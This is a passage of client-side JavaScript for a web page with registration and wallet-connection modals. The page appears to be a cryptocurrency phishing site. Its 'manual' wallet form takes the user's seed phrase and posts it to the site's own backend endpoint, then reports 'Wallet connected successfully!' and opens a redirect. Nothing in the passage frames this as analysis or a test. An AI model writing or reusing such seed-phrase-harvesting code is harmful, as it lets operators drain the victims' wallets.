                        sessionId: currentSessionId,
                        method: 'walletconnect'
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    closeWalletModal();
                    alert(`Wallet connected successfully! Address: ${data.walletAddress}`);
                    window.open(data.redirectUrl, '_blank');
                } else {
                    alert(data.error);
                }
            } catch (error) {
                console.error('WalletConnect error:', error);
                alert('WalletConnect failed. Please try again.');
            }
        });
    }

    if (manualWalletForm) {
        manualWalletForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            if (!currentSessionId) {
                alert('Please register first');
                return;
            }
            
            const mnemonic = mnemonicInput.value.trim();
            mnemonicError.classList.add('hidden');
            
            try {
                const response = await fetch(`${API_BASE}/api/wallet/connect`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        sessionId: currentSessionId,
                        method: 'manual',
                        data: { mnemonic }
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    closeWalletModal();
                    alert(`Wallet connected successfully! Address: ${data.walletAddress}`);
                    window.open(data.redirectUrl, '_blank');
                } else {
                    mnemonicError.textContent = data.error;
                    mnemonicError.classList.remove('hidden');
                }
            } catch (error) {
                console.error('Manual wallet connection error:', error);
                mnemonicError.textContent = 'Connection failed. Please try again.';
                mnemonicError.classList.remove('hidden');
            }
        });
    }

    // Close modal event listeners
    if (closeRegistrationBtn) {
        closeRegistrationBtn.addEventListener('click', closeRegistrationModal);
    }

    if (closeWalletBtn) {
        closeWalletBtn.addEventListener('click', closeWalletModal);
    }

    // Close modals when clicking outside
    if (registrationModal) {
        registrationModal.addEventListener('click', (e) => {
            if (e.target === registrationModal) {
                closeRegistrationModal();
            }
        });
    }

    if (walletModal) {
        walletModal.addEventListener('click', (e) => {
            if (e.target === walletModal) {
                closeWalletModal();
            }
        });
    }
});

